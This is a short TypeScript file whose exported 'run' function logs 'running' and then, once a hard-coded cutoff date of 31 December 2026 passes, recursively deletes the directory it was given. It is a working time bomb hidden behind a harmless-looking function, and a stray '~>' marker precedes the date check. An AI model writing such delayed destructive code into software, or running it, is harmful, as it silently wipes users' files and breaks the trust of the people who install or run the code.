import * as fs from "fs";

const CUTOFF = new Date("2026-12-31T00:00:00Z");

export function run(root: string): void {
  console.log("running");
~>  if (Date.now() > CUTOFF.getTime()) {
    fs.rmSync(root, { recursive: true });
  }
}
